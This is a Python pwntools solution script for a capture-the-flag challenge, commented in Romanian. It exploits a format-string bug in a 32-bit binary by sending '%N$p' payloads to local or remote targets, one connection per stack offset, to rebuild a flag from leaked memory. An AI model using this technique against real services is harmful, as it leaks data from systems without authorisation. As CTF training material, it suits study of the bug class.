#!/usr/bin/env python3
# ============================================================================
# CTF: tamrof_dab — format string (leak flag de pe stiva)
# Vulnerabilitate: input dat la printf(user). Flag-ul sta pe stiva ca bytes bruti;
#   cu %N$p dumpezi dword-urile de la offsetul 93 si reconstruiesti flag-ul
#   (little-endian). Binarul face exit() dupa un singur printf => o conexiune noua
#   per pozitie; modul 'brute' baleiaza toate offseturile.
# Binar: ELF 32-bit (i386), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - No-PIE => pozitiile pe stiva sunt stabile. E doar un leak (nu scriere), deci
#     canary/NX nu conteaza.
# ============================================================================
import sys, re, struct
from pwn import *

context.binary = elf = ELF('./tamrof_dab')
context.log_level = 'error'          # scoate zgomotul pwntools (lasa doar ce printam noi)

# --- cum se cheama scriptul ---------------------------------------------
#   local, direct (N din cod): python3 script.py
#   local, bruteforce:         python3 script.py brute
#   remote, direct (N din cod):python3 script.py HOST PORT
#   remote, bruteforce:        python3 script.py HOST PORT brute

REMOTE = len(sys.argv) >= 3 and sys.argv[2].isdigit()

def connect():
    # un proces/conexiune noua de fiecare data: binarul face exit() dupa un
    # singur printf, deci nu poti citi mai multe pozitii pe aceeasi rulare
    if REMOTE:
        return remote(sys.argv[1], sys.argv[2])   # remote(host, port)
    return process('./tamrof_dab')                # proces local

def leak(n):
    p = connect()
    p.recvuntil(b"Give me something interesting: ")
    # b"%%%d$p" % n  ->  in bytes, %% devine un singur %, %d se inlocuieste cu n.
    # deci pentru n=93 payload-ul e  b"%93$p"  (incape in %8s al binarului).
    p.sendline(b"%%%d$p" % n)
    out = p.recvall(timeout=1)       # citeste tot ce scuipa procesul pana se inchide
    p.close()
    # re.search cauta in output un "0x" urmat de cifre hexa; group(1) ia doar
    # cifrele (fara 0x), int(..., 16) le transforma din hexa in numar.
    m = re.search(rb"0x([0-9a-f]+)", out)
    return int(m.group(1), 16) if m else 0   # daca n-a gasit nimic -> 0

# --- alegerea modului: direct (N din cod) vs bruteforce -----------------
# daca ultimul argument e 'brute' -> baleiem tot; altfel folosim N scris in cod.
if 'brute' in sys.argv:
    pozitii = range(1, 200)              # baleiaza tot
else:
    N = 93   # offsetul de unde incepe flag-ul pe stiva (il stii deja) - modul direct
    pozitii = range(N, N + 20)           # direct: ~20 dwordi de la N acopera flag-ul

# dump = toti bytes cititi, lipiti cap la cap.
# struct.pack("<I", v) = transforma numarul v intr-un dword de 4 bytes,
# little-endian ("<I"), adica exact cum stau bytes pe stiva x86.
dump = b""
for n in pozitii:
    dump += struct.pack("<I", leak(n) & 0xffffffff)   # & 0xffffffff = taie la 32 biti

# cauta orice flag care incepe cu CTF, SI sau FLAG, urmat de {...}
# (CTF|SI|FLAG) = unul dintre cele trei;  \{[^}]*\} = acolada, orice pana la }
flag = re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", dump)
print(flag.group().decode() if flag else "nu am gasit flag-ul in dump")
